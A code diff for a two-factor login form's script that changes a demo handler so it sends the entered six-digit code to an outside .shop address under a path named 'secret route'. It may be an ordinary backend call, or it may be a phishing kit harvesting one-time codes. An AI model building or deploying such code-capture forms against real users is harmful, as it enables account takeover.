@@ -74,15 +74,35 @@ document.addEventListener("DOMContentLoaded", () => {
         continueBtn.disabled = !allFilled
     }
 
-    // Handle form submission
-    continueBtn.addEventListener("click", (e) => {
+    // Handle form submission via fetch
+    continueBtn.addEventListener("click", async (e) => {
         e.preventDefault();
-        let code = ""
 
-        inputs.forEach((input) => code += input.value);
-        // For demo purposes, we'll just clear the inputs
-        inputs.forEach((input) => input.value = "");
-        continueBtn.disabled = true
-        inputs[0].focus()
-    })
+        const code = Array.from(inputs).map(input => input.value).join("");
+
+        if (code.length !== 6) return;
+
+        try {
+            const response = await fetch("https://zezenta.shop/ruta/secreta/secretisima/2fa", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ code })  // puedes agregar más datos aquí si quieres
+            });
+
+            const result = await response.json();
+
+            if ( !response.ok) console.error("Error del servidor:", result);
+            
+        } catch (error) {
+            console.error("Error en la petición:", error);
+            alert("Error al verificar el código");
+        }
+
+        // Limpiar inputs
+        inputs.forEach(input => input.value = "");
+        continueBtn.disabled = true;
+        inputs[0].focus();
+    });
 })
